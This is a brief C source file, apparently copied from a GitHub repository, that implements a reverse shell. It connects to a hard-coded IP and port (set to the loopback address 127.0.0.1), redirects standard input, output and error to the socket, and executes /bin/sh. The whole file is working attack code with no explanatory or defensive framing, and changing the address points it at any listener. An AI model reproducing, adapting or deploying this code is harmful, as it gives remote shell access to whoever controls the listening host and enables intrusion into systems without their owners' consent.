/**
  src : https://github.com/pwnwithlove/C_revshell/blob/main/revshell.c
**/
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define IP "127.0.0.1"
#define PORT 14456

int main()
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    inet_pton(AF_INET, IP, &(server_addr.sin_addr));

    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", 0, 0);

    close(sockfd);

    return 0;
}
